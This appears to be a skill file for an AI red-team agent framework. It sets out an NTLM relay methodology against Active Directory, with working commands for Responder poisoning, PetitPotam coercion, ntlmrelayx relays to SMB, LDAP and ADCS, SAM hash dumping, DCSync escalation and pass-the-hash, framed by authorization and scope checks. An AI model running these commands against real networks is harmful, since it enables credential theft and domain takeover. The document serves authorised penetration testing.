---
name: ntlm-relay
description: "NTLM relay attacks with ntlmrelayx and CrackMapExec. Relay authentication to SMB/LDAP/HTTP. REQUIRES EXPLICIT AUTHORIZATION."
category: red-team
allowed_tools:
  - crackmapexec
  - ntlmrelayx
  - impacket
  - responder
version: "1.0.0"
author: "MIRV"
requires_scope: true
ethical_warning: true
---

# NTLM Relay Methodology

## 1. When to Use
- An authorised red-team engagement or isolated lab where you must demonstrate NTLM relay privilege escalation.
- SMB signing is disabled on a target host and you have a victim who will authenticate on the network.
- A purple-team exercise to validate blue-team NTLM relay detections (Event 4624 type 3 anonymous, SMB signing posture).
- An AD assessment to prove the impact of disabled SMB signing / LDAP signing / EPA.
- REQUIRES EXPLICIT WRITTEN AUTHORIZATION — relay attacks coerce authentication and can pivot to domain admin.

## 2. Prerequisites
- Written, signed authorisation covering the target subnet, victim hosts, and relay targets.
- Network access to the victim subnet (L2, ideally same broadcast domain for LLMNR/NBT-NS poisoning).
- `impacket` suite (`pip install impacket`) — provides `ntlmrelayx.py`, `responder`, `crackmapexec`/`nxc`.
- A victim who will authenticate during the engagement window (coercion via `PetitPotam`, `PrinterBug`, or wait for natural SMB traffic).
- Reconnaissance: enumerate hosts with SMB signing disabled (`crackmapexec smb {subnet} --gen-relay-list targets.txt`).
- OPSEC awareness: LLMNR/NBT-NS poisoning and coerced auth generate detectable events (4624, 4688, SMB traces).
- A non-production relay target; relaying to a production DC is high-impact — confirm scope explicitly.

## 3. Workflow
1. **Confirm scope and authorization**
   - Re-read the signed scope letter: confirm the subnet, the victim hosts, the relay targets, and the time window.
   - If scope_guard cannot validate `{target}` against the engagement scope, STOP and request explicit permission.
2. **Enumerate SMB signing posture**
   - `crackmapexec smb {subnet} --gen-relay-list targets.txt` — hosts with `(SMB signing: False)` are relayable.
   - Avoid DCs unless explicitly in scope — DCs usually enforce signing.
   - LDAP signing / channel binding: check via `crackmapexec ldap {subnet} --query` or test relays to LDAPS.
3. **Start the poisoner (Responder)**
   - `responder -I {iface} -rdwv` — answers LLMNR/NBT-NS for names that do not resolve, forcing victims to authenticate to you.
   - Disable SMB/HTTP in `Responder.conf` (`SMB = Off`, `HTTP = Off`) so Responder does not capture hashes — ntlmrelayx will handle the relay.
   - Alternative coercion: `PetitPotam.py {attacker_ip} {victim_ip}` (MS-EFSRPC) or `SpoolSample` (printer bug) to force a DC or host to authenticate to you.
4. **Start the relay (ntlmrelayx)**
   - `ntlmrelayx.py -tf targets.txt -smb2support` — relays captured SMB auth to each target in `targets.txt`, dumps SAM hashes.
   - LDAP relay: `ntlmrelayx.py -t ldap://{target} --escalate-user {user}` — relay to LDAP to grant a user DCSync rights (requires LDAP signing disabled, no channel binding).
   - HTTP relay: `ntlmrelayx.py -t http://{target} --adcs` — relay to an ADCS web enrollment endpoint to request a certificate (ESC8).
   - Multi-relay: `--no-smb-server --no-raw-server` to chain multiple victims to multiple targets.
5. **Exploit the relayed access**
   - SMB relay → SAM dump: `ntlmrelayx` outputs NTLM hashes for every local account on the relay target.
   - LDAP relay → ACL modification: grant your user `GenericAll` on the domain root or `DCSync` (DS-Replication-Get-Changes).
   - ADCS relay → certificate → `certipy auth -pfx {cert}.pfx -dc-ip {dc}` → PKINIT TGT → lateral as anyone.
   - CrackMapExec post-relay: `crackmapexec smb {target} -u {user} -H {ntlm_hash} --shares` to enumerate access with the relayed identity.
6. **Map to MITRE ATT&CK**
   - **T1557.001** NTLM Relay (LLMNR/NBT-NS Poisoning) — primary technique.
   - **T1557** Adversary-in-the-Middle — parent.
   - **T1003.002** Security Account Manager — SAM dump via SMB relay.
   - **T1642** ADCS Exploitation — if relayed to certificate web enrollment (ESC8).
   - **T1078** Valid Accounts — relayed identity used for access.
7. **Decision point**: if LDAP relay grants DCSync OR ADCS relay yields a DA-equivalent certificate, escalate as CRITICAL; the engagement is effectively domain-compromise — coordinate with the client before further action.

## 4. Verification
- Confirm a relay succeeded by checking the target host's Event 4624 type 3 for the victim's account from your attacker IP in the attack window.
- Validate dumped SAM hashes by cracking one offline (hashcat `-m 1000`) — confirms the hashes are real, not garbage.
- For LDAP relay: confirm the ACL change with `Invoke-ACLScanner` or `bloodhound` — the new ACE should appear on the target object.
- For ADCS relay: confirm the issued certificate with `certipy cert -pfx {cert}.pfx -nokey` and validate it authenticates a user via PKINIT.
- Produce a findings table: `{victim, relay_target, technique, outcome, detection_event}`.

## IMPORTANT
- ⚠️ AUTHORIZATION REQUIRED — NTLM relay coerces authentication from victims and can pivot to domain admin; illegal without scope.
- `requires_scope: true` — this skill only renders if scope_guard validates `{target}` against the engagement scope.
- OPSEC level: Loud. LLMNR/NBT-NS poisoning and coerced auth generate Event 4624/4688 on victims and DCs.
- SMB signing mitigation: if all relay targets enforce SMB signing, SMB relay fails — this is the expected hardening outcome; report it.
- LDAP relay requires LDAP signing disabled AND EPA/channel binding disabled on the target; modern AD patches mitigate this.
- NEVER leave an LDAP ACL escalation in place after the engagement — revert the ACE and confirm with the client.
- NEVER share or store relayed hashes/certificates in plaintext; MIRV `redact.py` masks them on mission save and audit log.
- Treat `{target}` / `{subnet}` / `{iface}` placeholders literally — never substitute unvalidated input.
- PetitPotam/printer-bug coercion can crash a DC in rare cases — test in a lab before production.
- If scope_guard denies the target, STOP and request explicit permission via the MIRV permission prompt system.
